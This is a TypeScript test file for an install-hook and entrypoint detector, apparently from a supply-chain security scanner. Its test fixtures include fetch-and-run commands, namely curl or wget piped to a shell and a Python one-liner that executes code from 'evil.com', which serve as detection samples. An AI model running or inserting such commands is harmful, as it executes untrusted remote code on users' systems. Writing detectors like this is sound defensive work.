import { describe, it, expect, vi, beforeEach } from 'vitest'
import { EntrypointDetector, createEntrypointDetector } from './entrypoint.js'
import * as utils from './utils.js'
import type { ScanContext } from './base.js'

vi.mock('./utils.js', async () => {
  const actual = await vi.importActual('./utils.js')
  return {
    ...actual,
    readFileContent: vi.fn()
  }
})

const mockReadFileContent = vi.mocked(utils.readFileContent)

function createContext(files: string[], rootPath = '/test/project'): ScanContext {
  return { files, rootPath }
}

describe('EntrypointDetector', () => {
  let detector: EntrypointDetector

  beforeEach(() => {
    detector = new EntrypointDetector()
    mockReadFileContent.mockReset()
  })

  describe('metadata', () => {
    it('should have correct type', () => {
      expect(detector.type).toBe('entrypoint')
    })

    it('should have correct name', () => {
      expect(detector.name).toBe('Entrypoint Detector')
    })
  })

  describe('package.json detection', () => {
    it('should detect postinstall script', async () => {
      const content = JSON.stringify({
        scripts: {
          postinstall: 'node setup.js'
        }
      })
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/package.json'])
      )

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('entrypoint_npm_postinstall')
      expect(findings[0].severity).toBe('high')
      expect(findings[0].evidence).toContain('node setup.js')
    })

    it('should detect preinstall script', async () => {
      const content = JSON.stringify({
        scripts: {
          preinstall: 'npm run check'
        }
      })
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/package.json'])
      )

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('entrypoint_npm_preinstall')
      expect(findings[0].severity).toBe('high')
    })

    it('should detect prepare script', async () => {
      const content = JSON.stringify({
        scripts: {
          prepare: 'husky install'
        }
      })
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/package.json'])
      )

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('entrypoint_npm_prepare')
      expect(findings[0].severity).toBe('medium')
    })

    it('should detect multiple scripts', async () => {
      const content = JSON.stringify({
        scripts: {
          preinstall: 'check',
          postinstall: 'setup'
        }
      })
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/package.json'])
      )

      expect(findings).toHaveLength(2)
    })
  })

  describe('setup.py detection', () => {
    it('should detect setup() call', async () => {
      const content = `
from setuptools import setup
setup(
    name='mypackage',
    install_requires=['requests']
)
`
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/setup.py'])
      )

      expect(findings.some((f) => f.rule === 'entrypoint_python_setup')).toBe(true)
    })

    it('should detect cmdclass', async () => {
      const content = `
from setuptools import setup
setup(
    cmdclass = {
        'install': CustomInstall
    }
)
`
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/setup.py'])
      )

      expect(findings.some((f) => f.rule === 'entrypoint_python_cmdclass')).toBe(
        true
      )
      expect(findings.find((f) => f.rule === 'entrypoint_python_cmdclass')?.severity).toBe('high')
    })
  })

  describe('Makefile detection', () => {
    it('should detect install target', async () => {
      const content = `
.PHONY: install
install:
	pip install -r requirements.txt
`
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/Makefile'])
      )

      expect(findings.some((f) => f.rule === 'entrypoint_makefile_install')).toBe(
        true
      )
    })

    it('should detect all target', async () => {
      const content = `
all: build test
	echo "Done"
`
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/Makefile'])
      )

      expect(findings.some((f) => f.rule === 'entrypoint_makefile_all')).toBe(true)
      expect(findings[0].severity).toBe('low')
    })
  })

  describe('shell script detection', () => {
    it('should detect install.sh', async () => {
      const content = '#!/bin/bash\necho "Installing..."'
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/install.sh'])
      )

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('entrypoint_install_script')
      expect(findings[0].severity).toBe('high')
    })

    it('should detect setup.sh', async () => {
      const content = '#!/bin/bash\nsetup commands'
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/setup.sh'])
      )

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('entrypoint_install_script')
    })

    it('should detect bootstrap.sh', async () => {
      const content = '#!/bin/bash\nbootstrap'
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/scripts/bootstrap.sh'])
      )

      expect(findings).toHaveLength(1)
    })
  })

  describe('Dockerfile detection', () => {
    it('should detect RUN command', async () => {
      const content = `
FROM node:18
RUN npm install -g typescript
`
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/Dockerfile'])
      )

      expect(findings.some((f) => f.rule === 'entrypoint_docker_run')).toBe(true)
    })

    it('should detect ENTRYPOINT', async () => {
      const content = `
FROM node:18
ENTRYPOINT ["node", "server.js"]
`
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/Dockerfile'])
      )

      expect(findings.some((f) => f.rule === 'entrypoint_docker_entrypoint')).toBe(
        true
      )
    })
  })

  describe('dangerous patterns detection', () => {
    it('should detect curl | bash', async () => {
      const content = 'curl -sSL https://example.com/install.sh | bash'
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/README.md'])
      )

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('entrypoint_curl_pipe_bash')
      expect(findings[0].severity).toBe('critical')
    })

    it('should detect wget | sh', async () => {
      const content = 'wget -qO- https://example.com/script | sh'
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/docs/install.md'])
      )

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('entrypoint_wget_pipe_bash')
      expect(findings[0].severity).toBe('critical')
    })

    it('should detect python remote exec', async () => {
      const content =
        'python3 -c "import urllib; exec(urllib.urlopen(\'http://evil.com\').read())"'
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/script.sh'])
      )

      expect(findings.some((f) => f.rule === 'entrypoint_python_exec_url')).toBe(
        true
      )
      expect(findings[0].severity).toBe('critical')
    })

    it('should detect multiple dangerous patterns', async () => {
      const content = `
curl https://a.com | bash
wget https://b.com | sh
`
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/install.md'])
      )

      expect(findings.length).toBeGreaterThanOrEqual(2)
    })

    it('should include line numbers for dangerous patterns', async () => {
      const content = `line1
line2
curl https://example.com | bash
line4`
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/file.sh'])
      )

      expect(findings[0].location.line).toBe(3)
    })
  })

  describe('edge cases', () => {
    it('should handle files that cannot be read', async () => {
      mockReadFileContent.mockResolvedValue(null)

      const findings = await detector.scan(
        createContext(['/test/project/missing.json'])
      )

      expect(findings).toHaveLength(0)
    })

    it('should handle empty files', async () => {
      mockReadFileContent.mockResolvedValue('')

      const findings = await detector.scan(
        createContext(['/test/project/package.json'])
      )

      expect(findings).toHaveLength(0)
    })

    it('should not match non-entrypoint files', async () => {
      const content = '{"name": "safe-package"}'
      mockReadFileContent.mockResolvedValue(content)

      const findings = await detector.scan(
        createContext(['/test/project/config.json'])
      )

      expect(findings).toHaveLength(0)
    })
  })

  describe('createEntrypointDetector', () => {
    it('should create an EntrypointDetector instance', () => {
      const detector = createEntrypointDetector()
      expect(detector).toBeInstanceOf(EntrypointDetector)
    })
  })
})
